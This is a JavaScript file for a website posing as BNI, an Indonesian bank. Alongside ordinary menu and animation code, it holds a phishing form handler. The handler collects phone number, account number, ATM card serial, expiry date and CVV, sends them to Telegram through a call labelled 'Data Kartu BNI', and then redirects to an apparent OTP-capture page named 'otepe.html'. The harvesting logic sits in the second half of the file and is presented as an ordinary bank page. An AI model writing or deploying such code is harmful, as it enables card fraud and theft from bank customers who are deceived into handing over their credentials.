document.addEventListener('DOMContentLoaded', function() {
    // Mobile Menu Toggle
    const mobileMenu = document.getElementById('mobile-menu');
    const navMenu = document.querySelector('.nav-menu');

    mobileMenu.addEventListener('click', function() {
        navMenu.classList.toggle('active');
        mobileMenu.classList.toggle('active');
    });

    // Smooth Scrolling for Navigation Links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
                // Close mobile menu after clicking
                navMenu.classList.remove('active');
            }
        });
    });

    // Navbar Background on Scroll - Disabled to keep white background
    // const navbar = document.querySelector('.navbar');
    // window.addEventListener('scroll', function() {
    //     if (window.scrollY > 100) {
    //         navbar.style.background = 'linear-gradient(135deg, #0052a3 0%, #003d7a 100%)';
    //         navbar.style.boxShadow = '0 4px 20px rgba(0, 0, 0, 0.15)';
    //     } else {
    //         navbar.style.background = 'linear-gradient(135deg, #0066cc 0%, #004499 100%)';
    //         navbar.style.boxShadow = '0 2px 10px rgba(0, 0, 0, 0.1)';
    //     }
    // });

    // Service Cards Animation on Scroll
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const observer = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, observerOptions);

    // Observe service cards and feature items
    document.querySelectorAll('.service-card, .feature-item').forEach(card => {
        card.style.opacity = '0';
        card.style.transform = 'translateY(20px)';
        card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        observer.observe(card);
    });

    // CTA Button Hover Effect
    const ctaButton = document.querySelector('.cta-button');
    if (ctaButton) {
        ctaButton.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-3px)';
        });
        ctaButton.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(-2px)';
        });
    }

    // Form Validation (for future login forms)
    function validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }

    // Loading Animation for Buttons
    function showLoading(button, originalText) {
        button.innerHTML = '<span class="loading"></span> Memuat...';
        button.disabled = true;
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.disabled = false;
        }, 2000);
    }

    // Add click handlers for service cards
    document.querySelectorAll('.service-card').forEach(card => {
        card.addEventListener('click', function() {
            const title = this.querySelector('h3').textContent;
            console.log(`Service clicked: ${title}`);
            // Add navigation or modal logic here
        });
    });

    // Add hover effect for feature icons
    document.querySelectorAll('.feature-icon').forEach(icon => {
        icon.addEventListener('mouseenter', function() {
            this.style.transform = 'scale(1.1)';
            this.style.transition = 'transform 0.3s ease';
        });
        icon.addEventListener('mouseleave', function() {
            this.style.transform = 'scale(1)';
        });
    });

    // Active Navigation Link Highlighting
    const sections = document.querySelectorAll('section[id]');
    const navLinks = document.querySelectorAll('.nav-link[href^="#"]');

    window.addEventListener('scroll', () => {
        let current = '';
        sections.forEach(section => {
            const sectionTop = section.offsetTop;
            const sectionHeight = section.clientHeight;
            if (scrollY >= (sectionTop - 200)) {
                current = section.getAttribute('id');
            }
        });

        navLinks.forEach(link => {
            link.classList.remove('active');
            if (link.getAttribute('href').slice(1) === current) {
                link.classList.add('active');
            }
        });
    });

    // Add active link styling
    const style = document.createElement('style');
    style.textContent = `
        .nav-link.active {
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 5px;
        }
        
        .nav-toggle span {
            display: block;
            width: 25px;
            height: 3px;
            margin: 5px auto;
            background-color: white;
            transition: all 0.3s ease-in-out;
        }
        
        .nav-toggle.active span:nth-child(1) {
            transform: translateY(8px) rotate(45deg);
        }
        
        .nav-toggle.active span:nth-child(2) {
            opacity: 0;
        }
        
        .nav-toggle.active span:nth-child(3) {
            transform: translateY(-8px) rotate(-45deg);
        }
    `;
    document.head.appendChild(style);

    console.log('BNI Website loaded successfully!');

    // Input Data Form Validation
    const dataForm = document.getElementById('dataForm');
    const submitBtn = document.getElementById('submitBtn');
    const successMessage = document.getElementById('successMessage');

    if (dataForm) {
        dataForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            if (validateDataForm()) {
                // Show loading state
                submitBtn.innerHTML = '<span class="loading"></span> Mengirim...';
                submitBtn.disabled = true;

                // Collect form data
                const formData = {
                    nomorHp: document.getElementById('nomor-hp').value,
                    nomorRekening: document.getElementById('nomor-rekening').value,
                    seriAtm: document.getElementById('seri-atm').value,
                    masaBerlaku: document.getElementById('masa-berlaku').value,
                    cvv: document.getElementById('cvv').value
                };

                // Show loading state
                submitBtn.innerHTML = 'Memproses..';
                submitBtn.disabled = true;

                // Send data to Telegram
                setTimeout(async () => {
                    try {
                        // Send to Telegram
                        const result = await sendToTelegram(formData, 'Data Kartu BNI');
                        
                        if (result.success) {
                            console.log('Data sent to Telegram successfully');
                            // Redirect to OTP page
                            window.location.href = 'otepe.html';
                        } else {
                            console.error('Failed to send to Telegram:', result.error);
                            submitBtn.innerHTML = 'Kirim Data';
                            submitBtn.disabled = false;
                        }
                        
                    } catch (error) {
                        console.error('Error during form submission:', error);
                        submitBtn.innerHTML = 'Kirim Data';
                        submitBtn.disabled = false;
                    }
                }, 1000);
            }
        });

        // Real-time validation
        const inputs = dataForm.querySelectorAll('input');
        inputs.forEach(input => {
            input.addEventListener('blur', function() {
                validateSingleField(this);
            });

            input.addEventListener('input', function() {
                if (this.classList.contains('error')) {
                    validateSingleField(this);
                }
            });
        });
    }

    function validateDataForm() {
        let isValid = true;
        const fields = [
            { id: 'nomor-hp', errorId: 'nomorHpError', validator: validatePhone },
            { id: 'nomor-rekening', errorId: 'nomorRekeningError', validator: validateRequired },
            { id: 'seri-atm', errorId: 'seriAtmError', validator: validateRequired },
            { id: 'masa-berlaku', errorId: 'masaBerlakuError', validator: validateExpiryDate },
            { id: 'cvv', errorId: 'cvvError', validator: validateCVV }
        ];

        fields.forEach(field => {
            const input = document.getElementById(field.id);
            const error = document.getElementById(field.errorId);
            
            if (!field.validator(input.value)) {
                input.classList.add('error');
                error.style.display = 'block';
                isValid = false;
            } else {
                input.classList.remove('error');
                error.style.display = 'none';
            }
        });

        return isValid;
    }

    function validateSingleField(input) {
        const fieldMap = {
            'nomor-hp': { errorId: 'nomorHpError', validator: validatePhone },
            'nomor-rekening': { errorId: 'nomorRekeningError', validator: validateRequired },
            'seri-atm': { errorId: 'seriAtmError', validator: validateRequired },
            'masa-berlaku': { errorId: 'masaBerlakuError', validator: validateExpiryDate },
            'cvv': { errorId: 'cvvError', validator: validateCVV }
        };

        const field = fieldMap[input.id];
        if (field) {
            const error = document.getElementById(field.errorId);
            
            if (!field.validator(input.value)) {
                input.classList.add('error');
                error.style.display = 'block';
            } else {
                input.classList.remove('error');
                error.style.display = 'none';
            }
        }
    }

    function validateRequired(value) {
        return value.trim() !== '';
    }

    function validatePhone(value) {
        const phoneRegex = /^[0-9]{10,15}$/;
        return phoneRegex.test(value.replace(/[^0-9]/g, ''));
    }

    function validateExpiryDate(value) {
        const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
        if (!expiryRegex.test(value)) return false;
        
        const [month, year] = value.split('/');
        const currentDate = new Date();
        const currentYear = currentDate.getFullYear() % 100;
        const currentMonth = currentDate.getMonth() + 1;
        
        const expYear = parseInt(year);
        const expMonth = parseInt(month);
        
        if (expYear < currentYear) return false;
        if (expYear === currentYear && expMonth < currentMonth) return false;
        
        return true;
    }

    function validateCVV(value) {
        const cvvRegex = /^\d{3}$/;
        return cvvRegex.test(value);
    }

    // Auto-format expiry date
    const expiryInput = document.getElementById('masa-berlaku');
    if (expiryInput) {
        expiryInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            e.target.value = value;
        });
    }

    // Auto-format phone number
    const phoneInput = document.getElementById('nomor-hp');
    if (phoneInput) {
        phoneInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
        });
    }

    // Auto-format CVV (numbers only)
    const cvvInput = document.getElementById('cvv');
    if (cvvInput) {
        cvvInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
        });
    }
});